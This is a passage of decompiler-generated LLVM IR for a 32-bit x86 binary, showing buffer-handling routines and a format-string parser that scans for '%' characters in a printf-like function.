  %v1_804c2b810 = icmp eq i1 %v1_804c2b63, false
  br i1 %v1_804c2b810, label %dec_label_pc_804c2a2.preheader, label %dec_label_pc_804c2ba

dec_label_pc_804c2a2.preheader:                   ; preds = %dec_label_pc_804c2b6.preheader
  br label %dec_label_pc_804c2a2

dec_label_pc_804c2a2:                             ; preds = %dec_label_pc_804c2a2.preheader, %dec_label_pc_804c2b3
  %v0_804c2aa = phi i32 [ %storemerge1, %dec_label_pc_804c2b3 ], [ %storemerge12, %dec_label_pc_804c2a2.preheader ]
  %v1_804c2a2 = inttoptr i32 %v0_804c2aa to i8*
  %v2_804c2a2 = load i8, i8* %v1_804c2a2, align 1
  %v3_804c2a2 = and i8 %v2_804c2a2, 64
  %v4_804c2a2 = icmp eq i8 %v3_804c2a2, 0
  br i1 %v4_804c2a2, label %dec_label_pc_804c2b3, label %dec_label_pc_804c2a7

dec_label_pc_804c2a7:                             ; preds = %dec_label_pc_804c2a2
  %v1_804c2ab = call i32 @function_804c2c0(i32 %v0_804c2aa)
  store i32 %v1_804c2ab, i32* %eax.global-to-local, align 4
  %v0_804c2b3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c2b3

dec_label_pc_804c2b3:                             ; preds = %dec_label_pc_804c2a2, %dec_label_pc_804c2a7
  %v0_804c2b3 = phi i32 [ %v0_804c2aa, %dec_label_pc_804c2a2 ], [ %v0_804c2b3.pre, %dec_label_pc_804c2a7 ]
  %v1_804c2b3 = add i32 %v0_804c2b3, 32
  %v2_804c2b3 = inttoptr i32 %v1_804c2b3 to i32*
  %storemerge1 = load i32, i32* %v2_804c2b3, align 4
  store i32 %storemerge1, i32* @ebx, align 4
  %v1_804c2b6 = icmp eq i32 %storemerge1, 0
  %v1_804c2b8 = icmp eq i1 %v1_804c2b6, false
  br i1 %v1_804c2b8, label %dec_label_pc_804c2a2, label %dec_label_pc_804c2ba

dec_label_pc_804c2ba:                             ; preds = %dec_label_pc_804c2b3, %dec_label_pc_804c2b6.preheader
  %v2_804c2ba = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c2ba, i32* %eax.global-to-local, align 4
  %v2_804c2bb = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804c2bb, i32* @ebx, align 4
  store i32 %v0_804c236, i32* @esi, align 4
  ret i32 %v2_804c2ba

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 2, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @function_804c21f, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_804c2b3, { 1, 0 }
  uselistorder label %dec_label_pc_804c2a2, { 1, 0 }
  uselistorder label %dec_label_pc_804c280, { 1, 0 }
  uselistorder label %dec_label_pc_804c259, { 1, 0 }
}

define i32 @function_804c2c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804c2c0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_804c2c0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804c2c8 = add i32 %arg1, 8
  %v2_804c2c8 = inttoptr i32 %v1_804c2c8 to i32*
  %v3_804c2c8 = load i32, i32* %v2_804c2c8, align 4
  store i32 %v3_804c2c8, i32* %edx.global-to-local, align 4
  %v1_804c2cb = add i32 %arg1, 16
  %v2_804c2cb = inttoptr i32 %v1_804c2cb to i32*
  %v3_804c2cb = load i32, i32* %v2_804c2cb, align 4
  %v2_804c2ce = sub i32 %v3_804c2cb, %v3_804c2c8
  %v12_804c2ce = icmp eq i32 %v2_804c2ce, 0
  store i32 %v2_804c2ce, i32* %eax.global-to-local, align 4
  br i1 %v12_804c2ce, label %dec_label_pc_804c2e1, label %dec_label_pc_804c2d2

dec_label_pc_804c2d2:                             ; preds = %dec_label_pc_804c2c0
  store i32 %v3_804c2c8, i32* %v2_804c2cb, align 4
  %v0_804c2d5 = load i32, i32* @ecx, align 4
  %v0_804c2d6 = load i32, i32* %eax.global-to-local, align 4
  %v0_804c2d7 = load i32, i32* %edx.global-to-local, align 4
  %v0_804c2d8 = load i32, i32* @ebx, align 4
  %v4_804c2d9 = inttoptr i32 %v0_804c2d8 to i16*
  %v5_804c2d9 = call i32 @function_804ffc8(i16* %v4_804c2d9, i32 %v0_804c2d7, i32 %v0_804c2d6, i32 %v0_804c2d5)
  store i32 %v5_804c2d9, i32* %eax.global-to-local, align 4
  %v0_804c2e1.pre = load i32, i32* @ebx, align 4
  %v2_804c2e7.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804c2e1

dec_label_pc_804c2e1:                             ; preds = %dec_label_pc_804c2c0, %dec_label_pc_804c2d2
  %v2_804c2e7 = phi i32 [ %tmp11, %dec_label_pc_804c2c0 ], [ %v2_804c2e7.pre, %dec_label_pc_804c2d2 ]
  %v0_804c2e1 = phi i32 [ %arg1, %dec_label_pc_804c2c0 ], [ %v0_804c2e1.pre, %dec_label_pc_804c2d2 ]
  %v1_804c2e1 = add i32 %v0_804c2e1, 16
  %v2_804c2e1 = inttoptr i32 %v1_804c2e1 to i32*
  %v3_804c2e1 = load i32, i32* %v2_804c2e1, align 4
  store i32 %v3_804c2e1, i32* %eax.global-to-local, align 4
  %v2_804c2e4 = add i32 %v0_804c2e1, 8
  %v3_804c2e4 = inttoptr i32 %v2_804c2e4 to i32*
  %v4_804c2e4 = load i32, i32* %v3_804c2e4, align 4
  %v5_804c2e4 = sub i32 %v3_804c2e1, %v4_804c2e4
  store i32 %v5_804c2e4, i32* %eax.global-to-local, align 4
  store i32 %v2_804c2e7, i32* @edx, align 4
  store i32 %v0_804c2c0, i32* @ebx, align 4
  ret i32 %v5_804c2e4

; uselistorder directives
  uselistorder i32 %v0_804c2e1, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804c2e1, { 1, 0 }
}

define i32 @function_804c2ec() local_unnamed_addr {
dec_label_pc_804c2ec:
  %stack_var_-13 = alloca i32, align 4
  %v0_804c2ec = load i32, i32* @edi, align 4
  %v0_804c2ed = load i32, i32* @eax, align 4
  store i32 %v0_804c2ed, i32* @edi, align 4
  %v0_804c2ef = load i32, i32* @esi, align 4
  %v0_804c2f0 = load i32, i32* @ecx, align 4
  store i32 %v0_804c2f0, i32* @esi, align 4
  %v0_804c2f2 = load i32, i32* @ebx, align 4
  store i32 %v0_804c2f0, i32* @ebx, align 4
  %v0_804c2f8 = load i32, i32* @edx, align 4
  store i32 %v0_804c2f8, i32* %stack_var_-13, align 4
  %v1_804c2ff2 = icmp eq i32 %v0_804c2f0, 0
  br i1 %v1_804c2ff2, label %dec_label_pc_804c317, label %dec_label_pc_804c303.lr.ph

dec_label_pc_804c303.lr.ph:                       ; preds = %dec_label_pc_804c2ec
  %v2_804c303 = ptrtoint i32* %stack_var_-13 to i32
  br label %dec_label_pc_804c303

dec_label_pc_804c2fe:                             ; preds = %dec_label_pc_804c303
  %v1_804c2fe = add i32 %v0_804c2fe, -1
  %v8_804c2fe = icmp eq i32 %v1_804c2fe, 0
  store i32 %v1_804c2fe, i32* @ebx, align 4
  br i1 %v8_804c2fe, label %dec_label_pc_804c317.loopexit, label %dec_label_pc_804c2fe.dec_label_pc_804c303_crit_edge

dec_label_pc_804c2fe.dec_label_pc_804c303_crit_edge: ; preds = %dec_label_pc_804c2fe
  %v0_804c307.pre = load i32, i32* @edx, align 4
  %v0_804c308.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804c303

dec_label_pc_804c303:                             ; preds = %dec_label_pc_804c2fe.dec_label_pc_804c303_crit_edge, %dec_label_pc_804c303.lr.ph
  %v0_804c308 = phi i32 [ %v0_804c308.pre, %dec_label_pc_804c2fe.dec_label_pc_804c303_crit_edge ], [ %v0_804c2ed, %dec_label_pc_804c303.lr.ph ]
  %v0_804c307 = phi i32 [ %v0_804c307.pre, %dec_label_pc_804c2fe.dec_label_pc_804c303_crit_edge ], [ %v0_804c2f8, %dec_label_pc_804c303.lr.ph ]
  %v4_804c30c = call i32 @function_8050048(i32 %v2_804c303, i32 1, i32 %v0_804c308, i32 %v0_804c307)
  %v8_804c314 = icmp eq i32 %v4_804c30c, 1
  %v0_804c2fe = load i32, i32* @ebx, align 4
  br i1 %v8_804c314, label %dec_label_pc_804c2fe, label %dec_label_pc_804c317.loopexit

dec_label_pc_804c317.loopexit:                    ; preds = %dec_label_pc_804c2fe, %dec_label_pc_804c303
  %v1_804c31a.ph = phi i32 [ %v0_804c2fe, %dec_label_pc_804c303 ], [ 0, %dec_label_pc_804c2fe ]
  %v0_804c31a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c317

dec_label_pc_804c317:                             ; preds = %dec_label_pc_804c317.loopexit, %dec_label_pc_804c2ec
  %v0_804c31a = phi i32 [ 0, %dec_label_pc_804c2ec ], [ %v0_804c31a.pre, %dec_label_pc_804c317.loopexit ]
  %v1_804c31a = phi i32 [ 0, %dec_label_pc_804c2ec ], [ %v1_804c31a.ph, %dec_label_pc_804c317.loopexit ]
  %v2_804c31a = sub i32 %v0_804c31a, %v1_804c31a
  store i32 %v0_804c2f2, i32* @ebx, align 4
  store i32 %v0_804c2ef, i32* @esi, align 4
  store i32 %v0_804c2ec, i32* @edi, align 4
  ret i32 %v2_804c31a

; uselistorder directives
  uselistorder i32 %v1_804c2fe, { 1, 0 }
  uselistorder i32* %stack_var_-13, { 1, 0 }
  uselistorder label %dec_label_pc_804c317.loopexit, { 1, 0 }
}

define i32 @function_804c322(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804c322:
  store i32 0, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_804c335 = trunc i32 %arg2 to i8
  %v5_804c335 = icmp slt i8 %v3_804c335, 0
  %v1_804c337 = icmp eq i1 %v5_804c335, false
  br i1 %v1_804c337, label %dec_label_pc_804c368, label %dec_label_pc_804c339

dec_label_pc_804c339:                             ; preds = %dec_label_pc_804c322
  %v1_804c340 = inttoptr i32 %arg4 to i8*
  %v2_804c340 = call i32 @function_804d514(i8* %v1_804c340)
  %v0_804c348 = load i32, i32* @ebx, align 4
  %v2_804c348 = sub i32 %v0_804c348, %v2_804c340
  store i32 %v2_804c348, i32* @ebx, align 4
  store i32 %v2_804c340, i32* @esi, align 4
  %tmp18 = icmp slt i32 %v2_804c348, 1
  br i1 %tmp18, label %dec_label_pc_804c366, label %dec_label_pc_804c350

dec_label_pc_804c350:                             ; preds = %dec_label_pc_804c339
  store i32 %arg1, i32* @eax, align 4
  %v0_804c354 = load i32, i32* @edi, align 4
  %v1_804c354 = urem i32 %v0_804c354, 128
  store i32 %v1_804c354, i32* @edi, align 4
  store i32 %v2_804c348, i32* @ecx, align 4
  store i32 %v1_804c354, i32* @edx, align 4
  %v0_804c35b = call i32 @function_804c2ec()
  %v12_804c360 = icmp eq i32 %v0_804c35b, %v2_804c348
  store i32 %v0_804c35b, i32* @ebp, align 4
  %v1_804c364 = icmp eq i1 %v12_804c360, false
  br i1 %v1_804c364, label %dec_label_pc_804c382, label %dec_label_pc_804c350.dec_label_pc_804c366_crit_edge

dec_label_pc_804c350.dec_label_pc_804c366_crit_edge: ; preds = %dec_label_pc_804c350
  %v0_804c366.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c366

dec_label_pc_804c366:                             ; preds = %dec_label_pc_804c350.dec_label_pc_804c366_crit_edge, %dec_label_pc_804c339
  %v0_804c366 = phi i32 [ %v0_804c366.pre, %dec_label_pc_804c350.dec_label_pc_804c366_crit_edge ], [ %v2_804c340, %dec_label_pc_804c339 ]
  store i32 %v0_804c366, i32* @ebx, align 4
  br label %dec_label_pc_804c368

dec_label_pc_804c368:                             ; preds = %dec_label_pc_804c322, %dec_label_pc_804c366
  %v0_804c373 = phi i32 [ %arg3, %dec_label_pc_804c322 ], [ %v0_804c366, %dec_label_pc_804c366 ]
  %tmp19 = icmp slt i32 %v0_804c373, 1
  br i1 %tmp19, label %dec_label_pc_804c380, label %dec_label_pc_804c36e

dec_label_pc_804c36e:                             ; preds = %dec_label_pc_804c368
  %v0_804c36e = load i32, i32* @ecx, align 4
  %v4_804c378 = call i32 @function_8050048(i32 %arg4, i32 %v0_804c373, i32 %arg1, i32 %v0_804c36e)
  br label %dec_label_pc_804c380

dec_label_pc_804c380:                             ; preds = %dec_label_pc_804c368, %dec_label_pc_804c36e
  %v1_804c380 = phi i32 [ 0, %dec_label_pc_804c368 ], [ %v4_804c378, %dec_label_pc_804c36e ]
  %v0_804c380 = load i32, i32* @ebp, align 4
  %v2_804c380 = add i32 %v0_804c380, %v1_804c380
  br label %dec_label_pc_804c382

dec_label_pc_804c382:                             ; preds = %dec_label_pc_804c350, %dec_label_pc_804c380
  %v0_804c385 = phi i32 [ %v0_804c35b, %dec_label_pc_804c350 ], [ %v2_804c380, %dec_label_pc_804c380 ]
  ret i32 %v0_804c385

; uselistorder directives
  uselistorder i32 %v0_804c373, { 1, 0 }
  uselistorder i32 %v0_804c35b, { 1, 2, 0 }
  uselistorder i32 %v1_804c354, { 1, 0 }
  uselistorder i32 %v2_804c348, { 0, 2, 1, 3 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804c382, { 1, 0 }
  uselistorder label %dec_label_pc_804c380, { 1, 0 }
  uselistorder label %dec_label_pc_804c368, { 1, 0 }
}

define i32 @function_804c38c(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804c38c:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804c38f = load i32, i32* @ebx, align 4
  store i32 %v0_804c38f, i32* %stack_var_-16, align 4
  %v4_804c38f = ptrtoint i32* %stack_var_-16 to i32
  %v1_804c390 = add i32 %v4_804c38f, -356
  %v10_804c390 = icmp slt i32 %v1_804c390, 0
  store i1 %v10_804c390, i1* %sf.global-to-local, align 1
  %v4_804c396 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804c396, i32* @ebx, align 4
  %v2_804c39e = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_804c39e, i32* @esi, align 4
  %v4_804c3a3 = call i32 @function_804c944(i32* nonnull %stack_var_-348, i32 %v4_804c396)
  store i32 %v4_804c3a3, i32* %eax.global-to-local, align 4
  %v2_804c3ab = icmp slt i32 %v4_804c3a3, 0
  store i1 %v2_804c3ab, i1* %sf.global-to-local, align 1
  %v1_804c3ad = icmp eq i1 %v2_804c3ab, false
  br i1 %v1_804c3ad, label %dec_label_pc_804c3ed, label %dec_label_pc_804c3af

dec_label_pc_804c3af:                             ; preds = %dec_label_pc_804c38c
  %v12_804c3a8 = ptrtoint i32* %stack_var_-364 to i32
  %v3_804c3af = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_804c3af, i32* @ebx, align 4
  %v1_804c3b3 = add i32 %v12_804c3a8, -12
  %v10_804c3b3 = icmp slt i32 %v1_804c3b3, 0
  store i1 %v10_804c3b3, i1* %sf.global-to-local, align 1
  %v1_804c3b7 = inttoptr i32 %v3_804c3af to i8*
  %v2_804c3b7 = call i32 @function_804d514(i8* %v1_804c3b7)
  store i32 %v2_804c3b7, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_804c3c6 = icmp eq i32 %v2_804c3b7, 0
  %v2_804c3c6 = icmp slt i32 %v2_804c3b7, 0
  store i1 %v2_804c3c6, i1* %sf.global-to-local, align 1
  br i1 %v1_804c3c6, label %dec_label_pc_804c936, label %dec_label_pc_804c3ce

dec_label_pc_804c3ce:                             ; preds = %dec_label_pc_804c3af
  %v0_804c3ce = load i32, i32* @edx, align 4
  %v0_804c3d7 = load i32, i32* @ebx, align 4
  %v5_804c3d8 = call i32 @function_8050048(i32 %v0_804c3d7, i32 %v2_804c3b7, i32 %arg1, i32 %v0_804c3ce)
  store i32 %v5_804c3d8, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_804c3e5 = load i32, i32* @esp, align 4
  %v1_804c3e5 = add i32 %v0_804c3e5, 16
  %v7_804c3e5 = icmp slt i32 %v1_804c3e5, 0
  store i1 %v7_804c3e5, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804c936

dec_label_pc_804c3ed:                             ; preds = %dec_label_pc_804c38c
  %v5_804c3f7 = call i32 @function_804c9b4(i32 %v2_804c39e, i32 %arg3, i32 %v4_804c3a3, i32 %v4_804c3a3)
  store i32 %v5_804c3f7, i32* %eax.global-to-local, align 4
  %v0_804c3fc = load i32, i32* @ebx, align 4
  store i32 %v0_804c3fc, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_804c406 = load i32, i32* @esp, align 4
  %v1_804c406 = add i32 %v0_804c406, 16
  %v7_804c406 = icmp slt i32 %v1_804c406, 0
  store i1 %v7_804c406, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_804c40c

dec_label_pc_804c40b:                             ; preds = %dec_label_pc_804c412
  %v1_804c40b = add i32 %v0_804c41a, 1
  %v9_804c40b = icmp slt i32 %v1_804c40b, 0
  store i1 %v9_804c40b, i1* %sf.global-to-local, align 1
  store i32 %v1_804c40b, i32* @ebx, align 4
  br label %dec_label_pc_804c40c.backedge

dec_label_pc_804c40c.backedge:                    ; preds = %dec_label_pc_804c40b, %dec_label_pc_804c91c, %dec_label_pc_804c927
  %v1_804c41619 = phi i32 [ %v1_804c41e, %dec_label_pc_804c40b ], [ %v3_804c91c, %dec_label_pc_804c91c ], [ %v1_804c44a, %dec_label_pc_804c927 ]
  %v0_804c40c17 = phi i32 [ %v1_804c40b, %dec_label_pc_804c40b ], [ %v3_804c91c, %dec_label_pc_804c91c ], [ %v1_804c927, %dec_label_pc_804c927 ]
  %v4_804c40c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c40c

dec_label_pc_804c40c:                             ; preds = %dec_label_pc_804c40c.backedge, %dec_label_pc_804c3ed
  %v1_804c41e = phi i32 [ %v1_804c41619, %dec_label_pc_804c40c.backedge ], [ %v0_804c3fc, %dec_label_pc_804c3ed ]
  %v0_804c41a = phi i32 [ %v0_804c40c17, %dec_label_pc_804c40c.backedge ], [ %v0_804c3fc, %dec_label_pc_804c3ed ]
  %v4_804c40c = phi i32 [ %v4_804c40c.pre, %dec_label_pc_804c40c.backedge ], [ %v5_804c3f7, %dec_label_pc_804c3ed ]
  %v1_804c40c = inttoptr i32 %v0_804c41a to i8*
  %v2_804c40c = load i8, i8* %v1_804c40c, align 1
  %v3_804c40c = zext i8 %v2_804c40c to i32
  %v5_804c40c = and i32 %v4_804c40c, -256
  %v6_804c40c = or i32 %v3_804c40c, %v5_804c40c
  store i32 %v6_804c40c, i32* %eax.global-to-local, align 4
  %v4_804c40e = icmp eq i8 %v2_804c40c, 0
  %v5_804c40e = icmp slt i8 %v2_804c40c, 0
  store i1 %v5_804c40e, i1* %sf.global-to-local, align 1
  br i1 %v4_804c40e, label %dec_label_pc_804c416, label %dec_label_pc_804c412

dec_label_pc_804c412:                             ; preds = %dec_label_pc_804c40c
  %v2_804c412 = add i8 %v2_804c40c, -37
  %v10_804c412 = icmp eq i8 %v2_804c412, 0
  %v11_804c412 = icmp slt i8 %v2_804c412, 0
  store i1 %v11_804c412, i1* %sf.global-to-local, align 1
  %v1_804c414 = icmp eq i1 %v10_804c412, false
  br i1 %v1_804c414, label %dec_label_pc_804c40b, label %dec_label_pc_804c416

dec_label_pc_804c416:                             ; preds = %dec_label_pc_804c412, %dec_label_pc_804c40c
  %v2_804c416 = sub i32 %v0_804c41a, %v1_804c41e
  %v12_804c416 = icmp eq i32 %v2_804c416, 0
  %v13_804c416 = icmp slt i32 %v2_804c416, 0
  store i1 %v13_804c416, i1* %sf.global-to-local, align 1
  br i1 %v12_804c416, label %dec_label_pc_804c441, label %dec_label_pc_804c41a

dec_label_pc_804c41a:                             ; preds = %dec_label_pc_804c416
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804c416, i32* @esi, align 4
  store i1 %v13_804c416, i1* %sf.global-to-local, align 1
  %tmp63 = icmp slt i32 %v2_804c416, 1
  br i1 %tmp63, label %dec_label_pc_804c436, label %dec_label_pc_804c424

dec_label_pc_804c424:                             ; preds = %dec_label_pc_804c41a
  %v0_804c424 = load i32, i32* @ebp, align 4
  %v1_804c424 = load i32, i32* @esp, align 4
  %v2_804c424 = add i32 %v1_804c424, -4
  %v3_804c424 = inttoptr i32 %v2_804c424 to i32*
  store i32 %v0_804c424, i32* %v3_804c424, align 4
  %v1_804c425 = add i32 %v1_804c424, 368
  %v2_804c425 = inttoptr i32 %v1_804c425 to i32*
  %v3_804c425 = load i32, i32* %v2_804c425, align 4
  %v5_804c425 = add i32 %v1_804c424, -8
  %v6_804c425 = inttoptr i32 %v5_804c425 to i32*
  store i32 %v3_804c425, i32* %v6_804c425, align 4
  %v0_804c42c = load i32, i32* @esi, align 4
  %v2_804c42c = add i32 %v1_804c424, -12
  %v3_804c42c = inttoptr i32 %v2_804c42c to i32*
  store i32 %v0_804c42c, i32* %v3_804c42c, align 4
  %v0_804c42d = load i32, i32* %edx.global-to-local, align 4
  %v2_804c42d = add i32 %v1_804c424, -16
  %v3_804c42d = inttoptr i32 %v2_804c42d to i32*
  store i32 %v0_804c42d, i32* %v3_804c42d, align 4
  %v0_804c42e = load i32, i32* %stack_var_-364, align 4
  %v4_804c42e = call i32 @function_8050048(i32 %v0_804c42e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c42e, i32* %eax.global-to-local, align 4
  %v0_804c433 = load i32, i32* @esp, align 4
  %v1_804c433 = add i32 %v0_804c433, 16
  %v7_804c433 = icmp slt i32 %v1_804c433, 0
  store i1 %v7_804c433, i1* %sf.global-to-local, align 1
  %v1_804c436.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804c436

dec_label_pc_804c436:                             ; preds = %dec_label_pc_804c41a, %dec_label_pc_804c424
  %v3_804c43e = phi i32 [ %v2_804c416, %dec_label_pc_804c41a ], [ %v1_804c436.pre, %dec_label_pc_804c424 ]
  %v0_804c436 = phi i32 [ 0, %dec_label_pc_804c41a ], [ %v4_804c42e, %dec_label_pc_804c424 ]
  %v2_804c436 = sub i32 %v0_804c436, %v3_804c43e
  %v12_804c436 = icmp eq i32 %v2_804c436, 0
  %v13_804c436 = icmp slt i32 %v2_804c436, 0
  store i1 %v13_804c436, i1* %sf.global-to-local, align 1
  %v1_804c438 = icmp eq i1 %v12_804c436, false
  %v0_804c92f.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_804c438, label %dec_label_pc_804c92f, label %dec_label_pc_804c43e

dec_label_pc_804c43e:                             ; preds = %dec_label_pc_804c436
  %v1_804c43e = inttoptr i32 %v0_804c92f.pre.pre to i32*
  %v2_804c43e = load i32, i32* %v1_804c43e, align 4
  %v4_804c43e = add i32 %v2_804c43e, %v3_804c43e
  %v15_804c43e = icmp slt i32 %v4_804c43e, 0
  store i1 %v15_804c43e, i1* %sf.global-to-local, align 1
  store i32 %v4_804c43e, i32* %v1_804c43e, align 4
  %v0_804c441.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c441

dec_label_pc_804c441:                             ; preds = %dec_label_pc_804c416, %dec_label_pc_804c43e
  %v0_804c927 = phi i32 [ %v0_804c41a, %dec_label_pc_804c416 ], [ %v0_804c441.pre, %dec_label_pc_804c43e ]
  %v1_804c441 = inttoptr i32 %v0_804c927 to i8*
  %v2_804c441 = load i8, i8* %v1_804c441, align 1
  %v3_804c441 = icmp eq i8 %v2_804c441, 0
  %v4_804c441 = icmp slt i8 %v2_804c441, 0
  store i1 %v4_804c441, i1* %sf.global-to-local, align 1
  br i1 %v3_804c441, label %dec_label_pc_804c936, label %dec_label_pc_804c44a

dec_label_pc_804c44a:                             ; preds = %dec_label_pc_804c441
  %v1_804c44a = add i32 %v0_804c927, 1
  %v2_804c44a = inttoptr i32 %v1_804c44a to i8*
  %v3_804c44a = load i8, i8* %v2_804c44a, align 1
  %v4_804c44a = add i8 %v3_804c44a, -37
  %v12_804c44a = icmp eq i8 %v4_804c44a, 0
  %v13_804c44a = icmp slt i8 %v4_804c44a, 0
  store i1 %v13_804c44a, i1* %sf.global-to-local, align 1
  store i32 %v1_804c44a, i32* %edx.global-to-local, align 4
  br i1 %v12_804c44a, label %dec_label_pc_804c927, label %dec_label_pc_804c457

dec_label_pc_804c457:                             ; preds = %dec_label_pc_804c44a
  %v1_804c457 = load i32, i32* @esp, align 4
  %v2_804c457 = add i32 %v1_804c457, 16
  %v3_804c457 = inttoptr i32 %v2_804c457 to i32*
  store i32 %v1_804c44a, i32* %v3_804c457, align 4
  %v0_804c45b = load i32, i32* @esp, align 4
  %v1_804c45b = add i32 %v0_804c45b, 340
  %v2_804c45b = inttoptr i32 %v1_804c45b to i32*
  store i32 0, i32* %v2_804c45b, align 4
  %v0_804c466 = load i32, i32* @esp, align 4
  %v1_804c466 = add i32 %v0_804c466, -12
  %v10_804c466 = icmp slt i32 %v1_804c466, 0
  store i1 %v10_804c466, i1* %sf.global-to-local, align 1
  %v1_804c469 = add i32 %v0_804c466, 16
  store i32 %v1_804c469, i32* @ebx, align 4
  %v2_804c46d = add i32 %v0_804c466, -16
  %v3_804c46d = inttoptr i32 %v2_804c46d to i32*
  store i32 %v1_804c469, i32* %v3_804c46d, align 4
  %v0_804c46e = load i32, i32* %stack_var_-364, align 4
  %v1_804c46e = inttoptr i32 %v0_804c46e to i32*
  %v2_804c46e = call i32 @function_804cb35(i32* %v1_804c46e)
  store i32 %v2_804c46e, i32* %eax.global-to-local, align 4
  %v0_804c473 = load i32, i32* @ebx, align 4
  %v1_804c473 = load i32, i32* @esp, align 4
  %v2_804c473 = inttoptr i32 %v1_804c473 to i32*
  store i32 %v0_804c473, i32* %v2_804c473, align 4
  %v0_804c476 = load i32, i32* %stack_var_-364, align 4
  %v1_804c476 = call i32 @function_804c9f8(i32 %v0_804c476)
  store i32 %v1_804c476, i32* %eax.global-to-local, align 4
  %v0_804c47b = load i32, i32* @esp, align 4
  %v1_804c47b = add i32 %v0_804c47b, 70
  %v2_804c47b = inttoptr i32 %v1_804c47b to i8*
  %v3_804c47b = load i8, i8* %v2_804c47b, align 1
  %v4_804c47b = zext i8 %v3_804c47b to i32
  store i32 %v4_804c47b, i32* @edi, align 4
  %v1_804c480 = add i32 %v0_804c47b, 16
  %v1_804c483 = add i32 %v0_804c47b, 56
  %v2_804c483 = inttoptr i32 %v1_804c483 to i32*
  %v3_804c483 = load i32, i32* %v2_804c483, align 4
  %v5_804c483 = icmp slt i32 %v3_804c483, 0
  store i1 %v5_804c483, i1* %sf.global-to-local, align 1
  %v1_804c488 = add i32 %v0_804c47b, 112
  store i32 %v1_804c488, i32* %edx.global-to-local, align 4
  %tmp64 = icmp slt i32 %v3_804c483, 1
  br i1 %tmp64, label %dec_label_pc_804c495, label %dec_label_pc_804c48e

dec_label_pc_804c48e:                             ; preds = %dec_label_pc_804c457
  %v2_804c48e = zext i8 %v3_804c47b to i32
  %v3_804c48e = mul nuw nsw i32 %v2_804c48e, 12
  store i32 %v3_804c48e, i32* %eax.global-to-local, align 4
  %v2_804c491 = add i32 %v0_804c47b, 100
  %v3_804c491 = add i32 %v2_804c491, %v3_804c48e
  store i32 %v3_804c491, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c495

dec_label_pc_804c495:                             ; preds = %dec_label_pc_804c457, %dec_label_pc_804c48e
  %v0_804c49d26 = phi i32 [ %v1_804c488, %dec_label_pc_804c457 ], [ %v3_804c491, %dec_label_pc_804c48e ]
  %v1_804c495 = add i32 %v0_804c47b, 60
  %v2_804c495 = inttoptr i32 %v1_804c495 to i32*
  %v3_804c495 = load i32, i32* %v2_804c495, align 4
  store i32 %v3_804c495, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804c4a870 = sub i32 0, %v3_804c495
  %v10_804c4a873 = and i32 %v3_804c495, %v2_804c4a870
  %v11_804c4a874 = icmp slt i32 %v10_804c4a873, 0
  %v13_804c4a875 = icmp slt i32 %v2_804c4a870, 0
  %v2_804c4aa76 = icmp eq i1 %v13_804c4a875, %v11_804c4a874
  br i1 %v2_804c4aa76, label %dec_label_pc_804c4ac, label %dec_label_pc_804c49d

dec_label_pc_804c49d:                             ; preds = %dec_label_pc_804c495, %dec_label_pc_804c49d
  %v0_804c4ac80 = phi i32 [ %v0_804c4ac, %dec_label_pc_804c49d ], [ %v1_804c480, %dec_label_pc_804c495 ]
  %v2_804c49d79 = phi i32 [ %v1_804c4a7, %dec_label_pc_804c49d ], [ 0, %dec_label_pc_804c495 ]
  %v0_804c49d78 = phi i32 [ %v1_804c4a4, %dec_label_pc_804c49d ], [ %v0_804c49d26, %dec_label_pc_804c495 ]
  %v3_804c49d = mul i32 %v2_804c49d79, 4
  %v4_804c49d = add i32 %v3_804c49d, 344
